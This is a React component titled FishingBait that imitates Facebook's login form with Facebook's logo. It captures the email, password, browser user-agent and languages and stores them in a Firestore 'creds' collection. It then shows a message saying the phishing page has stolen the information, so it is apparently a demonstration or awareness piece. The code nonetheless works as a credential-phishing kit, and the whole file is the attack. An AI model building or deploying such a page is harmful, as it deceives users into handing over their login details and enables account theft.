import React, {useState} from 'react'
import { doc, setDoc } from "firebase/firestore"; 
import { db } from "./firebase"


export default function FishingBait() {

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [hiddenInfo, setHiddenInfo] = useState('');
    const [errorMessage, setErrorMessage] = useState('')





    const handleSubmit  = async (e) => {
        e.preventDefault();
        const hiddenInfo = document.querySelector('#hidden-info').value;
        const hiddenInfo2 = document.querySelector('#hidden-info2').value;
        console.log('Email:', email);
        console.log('Password:', password);
        console.log('Hidden Info (User-Agent, IP, etc.):', hiddenInfo);
        console.log("languages", hiddenInfo2);
        await setDoc(doc(db, "creds", email+Math.random()), {
          email:email,
          password:password,
          hiddenInfo:hiddenInfo,
          hiddenInfo2:hiddenInfo2,
        });
        setErrorMessage("The fishing page has stolen your information")
      };


  return (
    <form onSubmit={handleSubmit} className='flex flex-col items-center bg-[#FFFFFF] w-[300px] h-fit text-black p-2 drop-shadow-2xl'>
<div className='w-[300px]'><img className="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></img></div>
<p className='text-rose-500 text-center'>{errorMessage}</p>
<div className='flex flex-col gap-2 mb-2'>
  
<input
         className='w-[250px] h-[25px] text-black border border-[1] border-[#DDDFE2] focus:bg-[#E8F0FE] focus:border-[#0866FF] rounded p-4'
          type="email"
          name="email"
          value={email}
          placeholder='Email or phone number'
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email" 
        />
<input
          className='w-[250px] h-[25px] text-black border border-[1] border-[#DDDFE2] focus:bg-[#E8F0FE] focus:border-[#0866FF] rounded p-4'
          type="password"
          name="password"
          value={password}
          placeholder='Password'
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password" 
        />

<input
        type="hidden"
        id="hidden-info"
        value={navigator.userAgent}
      />
      <input
        type="hidden" 
        id="hidden-info2"
        value={navigator.languages}
      />
  
    
</div>


<div>
     <button  className='bg-[#0866FF] w-[250px] rounded p-1 m-1 text-white p-1    '> submit</button>
 
</div>

    </form>
  )
}
